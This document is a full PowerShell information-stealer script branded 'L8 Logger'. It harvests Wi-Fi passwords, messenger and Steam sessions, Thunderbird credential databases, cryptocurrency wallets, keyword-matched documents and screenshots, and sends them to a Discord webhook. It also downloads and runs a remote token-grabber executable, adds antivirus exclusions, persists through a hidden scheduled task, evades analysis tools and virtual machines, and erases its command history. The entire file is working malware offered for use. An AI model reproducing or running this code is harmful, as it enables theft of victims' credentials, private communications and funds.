$ErrorActionPreference = 'SilentlyContinue' # Ignore all warnings
$ProgressPreference = 'SilentlyContinue' # Hide all Progresses

function CHECK_IF_ADMIN {
    $test = ([Security.Principal.WindowsPrincipal] [Security.Principal.WindowsIdentity]::GetCurrent()).IsInRole([Security.Principal.WindowsBuiltinRole]::Administrator); echo $test
}

function EXFILTRATE-DATA {
    $webhook = "YOUR_WEBHOOK_HERE"
    $ip = Invoke-WebRequest -Uri "https://api.ipify.org" -UseBasicParsing
    $ip = $ip.Content
    $ip > $env:LOCALAPPDATA\Temp\ip.txt
    $lang = (Get-WinUserLanguageList).LocalizedName
    $date = (get-date).toString("r")
    Get-ComputerInfo > $env:LOCALAPPDATA\Temp\system_info.txt
    $osversion = (Get-WmiObject -class Win32_OperatingSystem).Caption
    $osbuild = (Get-ItemProperty -Path c:\windows\system32\hal.dll).VersionInfo.FileVersion
    $displayversion = (Get-Item "HKLM:SOFTWARE\Microsoft\Windows NT\CurrentVersion").GetValue('DisplayVersion')
    $model = (Get-WmiObject -Class:Win32_ComputerSystem).Model
    $uuid = Get-WmiObject -Class Win32_ComputerSystemProduct | Select-Object -ExpandProperty UUID 
    $uuid > $env:LOCALAPPDATA\Temp\uuid.txt
    $cpu = Get-WmiObject -Class Win32_Processor | Select-Object -ExpandProperty Name
    $cpu > $env:LOCALAPPDATA\Temp\cpu.txt
    $gpu = (Get-WmiObject Win32_VideoController).Name 
    $gpu > $env:LOCALAPPDATA\Temp\GPU.txt
    $format = " GB"
    $total = Get-CimInstance Win32_PhysicalMemory | Measure-Object -Property capacity -Sum | Foreach {"{0:N2}" -f ([math]::round(($_.Sum / 1GB),2))}
    $raminfo = "$total" + "$format"  
    $mac = (Get-WmiObject win32_networkadapterconfiguration -ComputerName $env:COMPUTERNAME | Where{$_.IpEnabled -Match "True"} | Select-Object -Expand macaddress) -join ","
    $mac > $env:LOCALAPPDATA\Temp\mac.txt
    $username = $env:USERNAME
    $hostname = $env:COMPUTERNAME
    $netstat = netstat -ano > $env:LOCALAPPDATA\Temp\netstat.txt
	$mfg = (gwmi win32_computersystem).Manufacturer 
	
	# System Uptime
	function Get-Uptime {
        $ts = (Get-Date) - (Get-CimInstance -ClassName Win32_OperatingSystem -ComputerName $computername).LastBootUpTime
        $uptimedata = '{0} days {1} hours {2} minutes {3} seconds' -f $ts.Days, $ts.Hours, $ts.Minutes, $ts.Seconds
        $uptimedata
    }
    $uptime = Get-Uptime
	
	# List of Installed AVs
	function get-installed-av {
        $wmiQuery = "SELECT * FROM AntiVirusProduct"
        $AntivirusProduct = Get-WmiObject -Namespace "root\SecurityCenter2" -Query $wmiQuery  @psboundparameters 
        $AntivirusProduct.displayName 
    }
    $avlist = get-installed-av -autosize | ft | out-string
    
	# Extracts all Wifi Passwords
    $wifipasslist = netsh wlan show profiles | Select-String "\:(.+)$" | %{$name=$_.Matches.Groups[1].Value.Trim(); $_} | %{(netsh wlan show profile name="$name" key=clear)}  | Select-String "Key Content\W+\:(.+)$" | %{$pass=$_.Matches.Groups[1].Value.Trim(); $_} | %{[PSCustomObject]@{ PROFILE_NAME=$name;PASSWORD=$pass }} | out-string
    $wifi = $wifipasslist | out-string 
    $wifi > $env:temp\WIFIPasswords.txt
	
	# Screen Resolution
    $width = (((Get-WmiObject -Class Win32_VideoController).VideoModeDescription  -split '\n')[0]  -split ' ')[0]
    $height = (((Get-WmiObject -Class Win32_VideoController).VideoModeDescription  -split '\n')[0]  -split ' ')[2]  
    $split = "x"
    $screen = "$width" + "$split" + "$height"  
    $screen
    
	# Startup Apps , Running Services, Processes, Installed Applications, and Network Adapters
	function misc {
        Get-CimInstance Win32_StartupCommand | Select-Object Name, command, Location, User | Format-List > $env:temp\StartUpApps.txt
        Get-WmiObject win32_service |? State -match "running" | select Name, DisplayName, PathName, User | sort Name | ft -wrap -autosize >  $env:LOCALAPPDATA\Temp\running-services.txt
        Get-WmiObject win32_process | Select-Object Name,Description,ProcessId,ThreadCount,Handles,Path | ft -wrap -autosize > $env:temp\running-applications.txt
        Get-ItemProperty HKLM:\Software\Wow6432Node\Microsoft\Windows\CurrentVersion\Uninstall\* | Select-Object DisplayName, DisplayVersion, Publisher, InstallDate | Format-Table > $env:temp\Installed-Applications.txt
        Get-NetAdapter | ft Name,InterfaceDescription,PhysicalMediaType,NdisPhysicalMedium -AutoSize > $env:temp\NetworkAdapters.txt
	}
	misc 
	
    # Telegram Session Stealer
	function telegramstealer {
        $processName = "telegram"
        try {if (Get-Process $processName ) {Get-Process -Name $processName | Stop-Process }} catch {}
        $path = "$env:userprofile\AppData\Roaming\Telegram Desktop\tdata"
        $destination = "$env:localappdata\temp\telegram-session.zip"
        $exclude = @("_*.config","dumps","tdummy","emoji","user_data","user_data#2","user_data#3","user_data#4","user_data#5","user_data#6","*.json","webview")
        $files = Get-ChildItem -Path $path -Exclude $exclude
        Compress-Archive -Path $files -DestinationPath $destination -CompressionLevel Fastest
    }
    telegramstealer 
	
	# Element Session Stealer
    function elementstealer {
        $processName = "element"
        try {if (Get-Process $processName ) {Get-Process -Name $processName | Stop-Process }} catch {}
        $element_session = "$env:localappdata\temp\element-session"
        New-Item -ItemType Directory -Force -Path $element_session
        $elementfolder = "$env:userprofile\AppData\Roaming\Element"
        Copy-Item -Path "$elementfolder\databases" -Destination $element_session -Recurse -force
        Copy-Item -Path "$elementfolder\Local Storage" -Destination $element_session -Recurse -force
        Copy-Item -Path "$elementfolder\Session Storage" -Destination $element_session -Recurse -force
        Copy-Item -Path "$elementfolder\IndexedDB" -Destination $element_session -Recurse -force
        Copy-Item -Path "$elementfolder\sso-sessions.json" -Destination $element_session -Recurse -force
        $signal_zip = "$env:localappdata\temp\element-session.zip"
        Compress-Archive -Path $element_session -DestinationPath $signal_zip -CompressionLevel Fastest
    }
    elementstealer 
	
	# Signal Session Stealer
    function signalstealer {
        $processName = "Signal"
        try {if (Get-Process $processName ) {Get-Process -Name $processName | Stop-Process }} catch {}
        $signal_session = "$env:localappdata\temp\signal-session"
        New-Item -ItemType Directory -Force -Path $signal_session
        $signalfolder = "$env:userprofile\AppData\Roaming\Signal"
        Copy-Item -Path "$signalfolder\databases" -Destination $signal_session -Recurse -force
        Copy-Item -Path "$signalfolder\Local Storage" -Destination $signal_session -Recurse -force
        Copy-Item -Path "$signalfolder\Session Storage" -Destination $signal_session -Recurse -force
        Copy-Item -Path "$signalfolder\sql" -Destination $signal_session -Recurse -force
        Copy-Item -Path "$signalfolder\config.json" -Destination $signal_session -Recurse -force
        $signal_zip = "$env:localappdata\temp\signal-session.zip"
        Compress-Archive -Path $signal_session -DestinationPath $signal_zip -CompressionLevel Fastest
    }
    signalstealer 

    # Steam Session Stealer
	function steamstealer {
        $processName = "steam"
        try {if (Get-Process $processName ) {Get-Process -Name $processName | Stop-Process }} catch {}
        $steam_session = "$env:localappdata\temp\steam-session"
        New-Item -ItemType Directory -Force -Path $steam_session
        $steamfolder = ("${Env:ProgramFiles(x86)}\Steam")
        Copy-Item -Path "$steamfolder\config" -Destination $steam_session -Recurse -force
        $ssfnfiles = @("ssfn$1")
        foreach($file in $ssfnfiles) {
            Get-ChildItem -path $steamfolder -Filter ([regex]::escape($file) + "*") -Recurse -File | ForEach { Copy-Item -path $PSItem.FullName -Destination $steam_session }
        }
        $steam_zip = "$env:localappdata\temp\steam-session.zip"
        Compress-Archive -Path $steam_session -DestinationPath $steam_zip -CompressionLevel Fastest
    }
    steamstealer 
	
	# Desktop screenshot
    Add-Type -AssemblyName System.Windows.Forms,System.Drawing
    $screens = [Windows.Forms.Screen]::AllScreens
    $top    = ($screens.Bounds.Top    | Measure-Object -Minimum).Minimum
    $left   = ($screens.Bounds.Left   | Measure-Object -Minimum).Minimum
    $width  = ($screens.Bounds.Right  | Measure-Object -Maximum).Maximum
    $height = ($screens.Bounds.Bottom | Measure-Object -Maximum).Maximum
    $bounds   = [Drawing.Rectangle]::FromLTRB($left, $top, $width, $height)
    $bmp      = New-Object System.Drawing.Bitmap ([int]$bounds.width), ([int]$bounds.height)
    $graphics = [Drawing.Graphics]::FromImage($bmp)
    $graphics.CopyFromScreen($bounds.Location, [Drawing.Point]::Empty, $bounds.size)
    $bmp.Save("$env:localappdata\temp\desktop-screenshot.png")
    $graphics.Dispose()
    $bmp.Dispose()
	
	# Disk Information
    function diskdata {
        $disks = get-wmiobject -class "Win32_LogicalDisk" -namespace "root\CIMV2"
        $results = foreach ($disk in $disks) {
            if ($disk.Size -gt 0) {
                $SizeOfDisk = [math]::round($disk.Size/1GB, 0)
                $FreeSpace = [math]::round($disk.FreeSpace/1GB, 0)
                $usedspace = [math]::round(($disk.size - $disk.freespace) / 1GB, 2)
                [int]$FreePercent = ($FreeSpace/$SizeOfDisk) * 100
	    		[int]$usedpercent = ($usedspace/$SizeOfDisk) * 100
                [PSCustomObject]@{
                    Drive = $disk.Name
                    Name = $disk.VolumeName
                    "Total Disk Size" = "{0:N0} GB" -f $SizeOfDisk 
                    "Free Disk Size" = "{0:N0} GB ({1:N0} %)" -f $FreeSpace, ($FreePercent)
                    "Used Space" = "{0:N0} GB ({1:N0} %)" -f $usedspace, ($usedpercent)
                }
            }
        }
        $results | out-string 
    }
    $alldiskinfo = diskdata
    $alldiskinfo > $env:temp\DiskInfo.txt
    
	#Extracts Product Key
    function Get-ProductKey {
        try {
            $regPath = 'HKLM:\SOFTWARE\Microsoft\Windows NT\CurrentVersion\SoftwareProtectionPlatform'
            $keyName = 'BackupProductKeyDefault'
            $backupProductKey = Get-ItemPropertyValue -Path $regPath -Name $keyName
            return $backupProductKey
        } catch {
            return "No product key found"
        }
    }
    
    $ProductKey = Get-ProductKey
    Get-ProductKey > $env:localappdata\temp\ProductKey.txt	
	
	# Create temporary directory to store wallet data for exfiltration
	New-Item -Path "$env:localappdata\Temp" -Name "Crypto Wallets" -ItemType Directory -force | out-null
	$crypto = "$env:localappdata\Temp\Crypto Wallets"

    # Thunderbird Exfil
    $Thunderbird = @('key4.db', 'key3.db', 'logins.json', 'cert9.db')
    If (Test-Path -Path "$env:USERPROFILE\AppData\Roaming\Thunderbird\Profiles") {
    New-Item -Path "$crypto\Thunder" -ItemType Directory | Out-Null
    Get-ChildItem "$env:USERPROFILE\AppData\Roaming\Thunderbird\Profiles" -Include $Thunderbird -Recurse | Copy-Item -Destination "$crypto\Thunder" -Recurse -Force
    }
    # Crypto Wallets
    
    If (Test-Path -Path "$env:userprofile\AppData\Roaming\Armory") {
    New-Item -Path "$crypto\Armory" -ItemType Directory | Out-Null
    Get-ChildItem "$env:userprofile\AppData\Roaming\Armory" -Recurse | Copy-Item -Destination "$crypto\Armory" -Recurse -Force
    }
    
    If (Test-Path -Path "$env:userprofile\AppData\Roaming\Atomic") {
    New-Item -Path "$crypto\Atomic" -ItemType Directory | Out-Null
    Get-ChildItem "$env:userprofile\AppData\Roaming\Atomic\Local Storage\leveldb" -Recurse | Copy-Item -Destination "$crypto\Atomic" -Recurse -Force
    }
    
    If (Test-Path -Path "Registry::HKEY_CURRENT_USER\software\Bitcoin") {
    New-Item -Path "$crypto\BitcoinCore" -ItemType Directory | Out-Null
    Get-ChildItem (Get-ItemProperty -Path "Registry::HKEY_CURRENT_USER\software\Bitcoin\Bitcoin-Qt" -Name strDataDir).strDataDir -Include *wallet.dat -Recurse | Copy-Item -Destination "$crypto\BitcoinCore" -Recurse -Force
    }
    If (Test-Path -Path "$env:userprofile\AppData\Roaming\bytecoin") {
    New-Item -Path "$crypto\bytecoin" -ItemType Directory | Out-Null
    Get-ChildItem ("$env:userprofile\AppData\Roaming\bytecoin", "$env:userprofile") -Include *.wallet -Recurse | Copy-Item -Destination "$crypto\bytecoin" -Recurse -Force
    }
    If (Test-Path -Path "$env:userprofile\AppData\Local\Coinomi") {
    New-Item -Path "$crypto\Coinomi" -ItemType Directory | Out-Null
    Get-ChildItem "$env:userprofile\AppData\Local\Coinomi\Coinomi\wallets" -Recurse | Copy-Item -Destination "$crypto\Coinomi" -Recurse -Force
    }
    If (Test-Path -Path "Registry::HKEY_CURRENT_USER\software\Dash") {
    New-Item -Path "$crypto\DashCore" -ItemType Directory | Out-Null
    Get-ChildItem (Get-ItemProperty -Path "Registry::HKEY_CURRENT_USER\software\Dash\Dash-Qt" -Name strDataDir).strDataDir -Include *wallet.dat -Recurse | Copy-Item -Destination "$crypto\DashCore" -Recurse -Force
    }
    If (Test-Path -Path "$env:userprofile\AppData\Roaming\Electrum") {
    New-Item -Path "$crypto\Electrum" -ItemType Directory | Out-Null
    Get-ChildItem "$env:userprofile\AppData\Roaming\Electrum\wallets" -Recurse | Copy-Item -Destination "$crypto\Electrum" -Recurse -Force
    }
    If (Test-Path -Path "$env:userprofile\AppData\Roaming\Ethereum") {
    New-Item -Path "$crypto\Ethereum" -ItemType Directory | Out-Null
    Get-ChildItem "$env:userprofile\AppData\Roaming\Ethereum\keystore" -Recurse | Copy-Item -Destination "$crypto\Ethereum" -Recurse -Force
    }
    If (Test-Path -Path "$env:userprofile\AppData\Roaming\Exodus") {
    New-Item -Path "$crypto\exodus.wallet" -ItemType Directory | Out-Null
    Get-ChildItem "$env:userprofile\AppData\Roaming\exodus.wallet" -Recurse | Copy-Item -Destination "$crypto\exodus.wallet" -Recurse -Force
    }
	If (Test-Path -Path "$env:userprofile\AppData\Roaming\Guarda") {
    New-Item -Path "$crypto\Guarda" -ItemType Directory | Out-Null
    Get-ChildItem "$env:userprofile\AppData\Roaming\Guarda\IndexedDB" -Recurse | Copy-Item -Destination "$crypto\Guarda" -Recurse -Force
    }
    If (Test-Path -Path "$env:userprofile\AppData\Roaming\com.liberty.jaxx") {
    New-Item -Path "$crypto\liberty.jaxx" -ItemType Directory | Out-Null
    Get-ChildItem "$env:userprofile\AppData\Roaming\com.liberty.jaxx\IndexedDB\file__0.indexeddb.leveldb" -Recurse | Copy-Item -Destination "$crypto\liberty.jaxx" -Recurse -Force
    }
    If (Test-Path -Path "Registry::HKEY_CURRENT_USER\software\Litecoin") {
    New-Item -Path "$crypto\Litecoin" -ItemType Directory | Out-Null
    Get-ChildItem (Get-ItemProperty -Path "Registry::HKEY_CURRENT_USER\software\Litecoin\Litecoin-Qt" -Name strDataDir).strDataDir -Include *wallet.dat -Recurse | Copy-Item -Destination "$crypto\Litecoin" -Recurse -Force
    }
    If (Test-Path -Path "Registry::HKEY_CURRENT_USER\software\monero-project") {
    New-Item -Path "$crypto\Monero" -ItemType Directory | Out-Null
    Get-ChildItem (Get-ItemProperty -Path "Registry::HKEY_CURRENT_USER\software\monero-project\monero-core" -Name wallet_path).wallet_path -Recurse | Copy-Item -Destination "$crypto\Monero" -Recurse  -Force
    }
    If (Test-Path -Path "$env:userprofile\AppData\Roaming\Zcash") {
    New-Item -Path "$crypto\Zcash" -ItemType Directory | Out-Null
    Get-ChildItem "$env:userprofile\AppData\Roaming\Zcash" -Recurse | Copy-Item -Destination "$crypto\Zcash" -Recurse -Force
    }

    #Files Grabber 
	New-Item -Path "$env:localappdata\Temp" -Name "Files Grabber" -ItemType Directory -force | out-null
	$filegrabber = "$env:localappdata\Temp\Files Grabber"
	Function GrabFiles {
        $grabber = @(
            "account",
            "login",
            "metamask",
            "crypto",
            "code",
            "coinbase",
            "exodus",
            "backupcode",
            "token",
            "seedphrase",
            "private",
            "pw",
            "lastpass",
            "keepassx",
            "keepass",
            "keepassxc",
            "nordpass",
            "syncthing",
            "dashlane",
            "bitwarden",
            "memo",
            "keys",
            "secret",
            "recovery",
            "2fa",
            "pass",
            "login",
            "backup",
            "discord",
            "paypal",
            "wallet"
        )
        $dest = "$env:localappdata\Temp\Files Grabber"
        $paths = "$env:userprofile\Downloads", "$env:userprofile\Documents", "$env:userprofile\Desktop"
        [regex] $grab_regex = "(" + (($grabber |foreach {[regex]::escape($_)}) -join "|") + ")"
        (gci -path $paths -Include "*.pdf","*.txt","*.doc","*.csv","*.rtf","*.docx" -r | ? Length -lt 5mb) -match $grab_regex | Copy-Item -Destination $dest -Force
    }
    GrabFiles
    
    $embed_and_body = @{
        "username" = "L8 Services"
        "content" = "@everyone"
        "title" = "L8 Services"
        "description" = "Made by L838"
        "color" = "000"
        "avatar_url" = "https://cdn.discordapp.com/attachments/920521601299140668/1138740512023650394/cat.jpg"
        "url" = "https://feds.lol/Unthinkable"
        "embeds" = @(
            @{
                "title" = "L8 Logger"
                "url" = "https://feds.lol/Unthinkable"
                "description" = "Made by L838"
                "color" = "460551"
                "footer" = @{
                    "text" = "Made by L8"
                }
                "thumbnail" = @{
                    "url" = "https://cdn.discordapp.com/attachments/920521601299140668/1138740512023650394/cat.jpg"
                }
                "fields" = @(
                    @{
                        "name" = "<a:CrownUnthinkable:1105328180350439504> IP"
                        "value" = "``````$ip``````"
                    },
                    @{
                        "name" = "<:JokerUnthinkable:1105329668393009243> User Information"
                        "value" = "``````Date: $date `nLanguage: $lang `nUsername: $username `nHostname: $hostname``````"
                    },
					@{
                        "name" = "<:LockUnthinkable:1105329669642911824> Antivirus"
                        "value" = "``````$avlist``````"
                    },
                    @{
                        "name" = "<:PCunthinkable:1105468852046921859> Hardware"
                        "value" = "``````Screen Size: $screen `nOS: $osversion `nOS Build: $osbuild `nOS Version: $displayversion `nManufacturer: $mfg `nModel: $model `nCPU: $cpu `nGPU: $gpu `nRAM: $raminfo `nHWID: $uuid `nMAC: $mac `nUptime: $uptime``````"
                    },
                    @{
                        "name" = "<:BlackfloppyUnthinkable:1105468846787285002> Disk"
                        "value" = "``````$alldiskinfo``````"
                    }
                    @{
                        "name" = "<:WIFIUnthinkable:1105468844476203121> WiFi"
                        "value" = "``````$wifi``````"
                    }
                )
            }
        )
    }

    $payload = $embed_and_body | ConvertTo-Json -Depth 10
    Invoke-WebRequest -Uri $webhook -Method POST -Body $payload -ContentType "application/json" -UseBasicParsing | Out-Null
	
	# Screenshot Embed
	curl.exe -F "payload_json={\`"username\`": \`"L8 Services\`", \`"content\`": \`" **Screenshot**\`"}" -F "file=@\`"$env:localappdata\temp\desktop-screenshot.png\`"" $webhook | out-null

    Set-Location $env:LOCALAPPDATA\Temp

    $token_prot = Test-Path "$env:APPDATA\DiscordTokenProtector\DiscordTokenProtector.exe"
    if ($token_prot -eq $true) {
        Remove-Item "$env:APPDATA\DiscordTokenProtector\DiscordTokenProtector.exe" -Force
    }

    $secure_dat = Test-Path "$env:APPDATA\DiscordTokenProtector\secure.dat"
    if ($secure_dat -eq $true) {
        Remove-Item "$env:APPDATA\DiscordTokenProtector\secure.dat" -Force
    }

    $TEMP_KOT = Test-Path "$env:LOCALAPPDATA\Temp\L8"
    if ($TEMP_KOT -eq $false) {
        New-Item "$env:LOCALAPPDATA\Temp\L8" -Type Directory
    }
    
    #Invoke-WebRequest -Uri "https://github.com/KDot227/Powershell-Token-Grabber/releases/download/V4.1/main.exe" -OutFile "main.exe" -UseBasicParsing
    (New-Object System.Net.WebClient).DownloadFile("https://github.com/KDot227/Powershell-Token-Grabber/releases/download/V4.1/main.exe", "$env:LOCALAPPDATA\Temp\main.exe")

    #This is needed for the injection to work
    Stop-Process -Name discord -Force
    Stop-Process -Name discordcanary -Force
    Stop-Process -Name discordptb -Force

    $proc = Start-Process $env:LOCALAPPDATA\Temp\main.exe -ArgumentList "$webhook" -NoNewWindow -PassThru
    $proc.WaitForExit()

    $extracted = "$env:LOCALAPPDATA\Temp"
    Move-Item -Path "$extracted\ip.txt" -Destination "$extracted\L8\ip.txt" 
    Move-Item -Path "$extracted\netstat.txt" -Destination "$extracted\L8\netstat.txt" 
    Move-Item -Path "$extracted\system_info.txt" -Destination "$extracted\L8\system_info.txt" 
    Move-Item -Path "$extracted\uuid.txt" -Destination "$extracted\L8\uuid.txt" 
    Move-Item -Path "$extracted\mac.txt" -Destination "$extracted\L8\mac.txt" 
    Move-Item -Path "$extracted\browser-cookies.txt" -Destination "$extracted\L8\browser-cookies.txt" 
    Move-Item -Path "$extracted\browser-history.txt" -Destination "$extracted\L8\browser-history.txt" 
    Move-Item -Path "$extracted\browser-passwords.txt" -Destination "$extracted\L8\browser-passwords.txt" 
    Move-Item -Path "$extracted\desktop-screenshot.png" -Destination "$extracted\L8\desktop-screenshot.png" 
    Move-Item -Path "$extracted\tokens.txt" -Destination "$extracted\L8\tokens.txt" 
    Move-Item -Path "$extracted\WIFIPasswords.txt" -Destination "$extracted\L8\WIFIPasswords.txt" 
    Move-Item -Path "$extracted\GPU.txt" -Destination "$extracted\L8\GPU.txt" 
    Move-Item -Path "$extracted\Installed-Applications.txt" -Destination "$extracted\L8\Installed-Applications.txt" 
    Move-Item -Path "$extracted\DiskInfo.txt" -Destination "$extracted\L8\DiskInfo.txt" 
    Move-Item -Path "$extracted\CPU.txt" -Destination "$extracted\L8\CPU.txt" 
    Move-Item -Path "$extracted\NetworkAdapters.txt" -Destination "$extracted\L8\NetworkAdapters.txt" 
    Move-Item -Path "$extracted\ProductKey.txt" -Destination "$extracted\L8\ProductKey.txt" 
    Move-Item -Path "$extracted\StartUpApps.txt" -Destination "$extracted\L8\StartUpApps.txt" 
    Move-Item -Path "$extracted\running-services.txt" -Destination "$extracted\L8\running-services.txt" 
    Move-Item -Path "$extracted\running-applications.txt" -Destination "$extracted\L8\running-applications.txt" 
	Move-Item -Path "$extracted\telegram-session.zip" -Destination "$extracted\L8\telegram-session.zip" 
	Move-Item -Path "$extracted\element-session.zip" -Destination "$extracted\L8\element-session.zip" 
	Move-Item -Path "$extracted\signal-session.zip" -Destination "$extracted\L8\signal-session.zip" 
	Move-Item -Path "$extracted\steam-session.zip" -Destination "$extracted\L8\steam-session.zip" 
	Move-Item -Path "Files Grabber" -Destination "$extracted\L8\Files Grabber" 
	Move-Item -Path "Crypto Wallets" -Destination "$extracted\L8\Crypto Wallets" 
    Compress-Archive -Path "$extracted\L8" -DestinationPath "$extracted\L8-LOG.zip" -Force
    curl.exe -X POST -F 'payload_json={\"username\": \"L8 Services\", \"content\": \"\", \"avatar_url\": \"https://cdn.discordapp.com/attachments/920521601299140668/1138740512023650394/cat.jpg\"}' -F "file=@$extracted\L8-LOG.zip" $webhook
    Remove-Item "$extracted\L8-LOG.zip"
    Remove-Item "$extracted\L8" -Recurse
	Remove-Item "$filegrabber\Files Grabber" -recurse -force
	Remove-Item "$crypto\Crypto Wallets" -recurse -force
	Remove-Item "$extracted\element-session" -recurse -force
	Remove-Item "$extracted\signal-session" -recurse -force
	Remove-Item "$extracted\steam-session" -recurse -force
    Remove-Item "$extracted\main.exe"
}

function Invoke-TASKS {
    Add-MpPreference -ExclusionPath "$env:LOCALAPPDATA\Temp"
    Add-MpPreference -ExclusionPath "$env:APPDATA\L8"
    New-Item -ItemType Directory -Path "$env:APPDATA\L8" -Force
	
	# Hidden Directory
	$L8_DIR=get-item "$env:APPDATA\L8" -Force
    $L8_DIR.attributes="Hidden","System"
    
	$origin = $PSCommandPath
    Copy-Item -Path $origin -Destination "$env:APPDATA\L8\L8.ps1" -Force
    $task_name = "L8"
    $task_action = New-ScheduledTaskAction -Execute "mshta.exe" -Argument 'vbscript:createobject("wscript.shell").run("PowerShell.exe -ExecutionPolicy Bypass -File %appdata%\L8\L8.ps1",0)(window.close)'
    $task_trigger = New-ScheduledTaskTrigger -AtLogOn
    $task_settings = New-ScheduledTaskSettingsSet -AllowStartIfOnBatteries -DontStopIfGoingOnBatteries -RunOnlyIfNetworkAvailable -DontStopOnIdleEnd -StartWhenAvailable
    Register-ScheduledTask -Action $task_action -Trigger $task_trigger -Settings $task_settings -TaskName $task_name -Description "L8" -RunLevel Highest -Force
    EXFILTRATE-DATA
}

function Request-Admin {
    while(!(CHECK_IF_ADMIN)) {
        try {
            Start-Process "powershell.exe" -ArgumentList "-NoProfile -ExecutionPolicy Bypass -WindowStyle hidden -File `"$PSCommandPath`"" -Verb RunAs
            exit
        }
        catch {}
    }
}

function Invoke-ANTIVM {
    $processnames= @(
            "autoruns",
            "autorunsc",
            "dumpcap",
            "Fiddler",
            "fakenet",
            "hookexplorer",
            "immunitydebugger",
            "httpdebugger",
            "importrec",
            "lordpe",
            "petools",
            "processhacker",
            "resourcehacker",
            "scylla_x64",
            "sandman",
            "sysinspector",
            "tcpview",
            "die",
            "dumpcap",
            "filemon",
            "idaq",
            "idaq64",
            "joeboxcontrol",
            "joeboxserver",
            "ollydbg",
            "proc_analyzer",
            "procexp",
            "procmon",
            "pestudio",
            "qemu-ga",
            "qga",
            "regmon",
            "sniff_hit",
            "sysanalyzer",
            "tcpview",
            "windbg",
            "wireshark",
            "x32dbg",
            "x64dbg",
            "vmwareuser",
            "vmacthlp",
            "vboxservice",
            "vboxtray",
            "xenservice"
        )
    $detectedProcesses = $processnames | ForEach-Object {
        $processName = $_
        if (Get-Process -Name $processName -ErrorAction SilentlyContinue) {
            $processName
        }
    }

    if ($null -eq $detectedProcesses) { 
        Invoke-TASKS
    }
    else { 
        Write-Output "Detected processes: $($detectedProcesses -join ', ')"
        Exit
    }
}


function Hide-Console
{
    if (-not ("Console.Window" -as [type])) { 
        Add-Type -Name Window -Namespace Console -MemberDefinition '
        [DllImport("Kernel32.dll")]
        public static extern IntPtr GetConsoleWindow();
        [DllImport("user32.dll")]
        public static extern bool ShowWindow(IntPtr hWnd, Int32 nCmdShow);
        '
    }
    $consolePtr = [Console.Window]::GetConsoleWindow()
    $null = [Console.Window]::ShowWindow($consolePtr, 0)
}

if (CHECK_IF_ADMIN -eq $true) {
    Hide-Console
    Invoke-ANTIVM
    # Self-Destruct
	# Remove-Item $PSCommandPath -Force 
} else {
    Write-Host ("Please run as admin!") -ForegroundColor Red
    Start-Sleep -s 1
    Request-Admin
}

Remove-Item (Get-PSreadlineOption).HistorySavePath
 
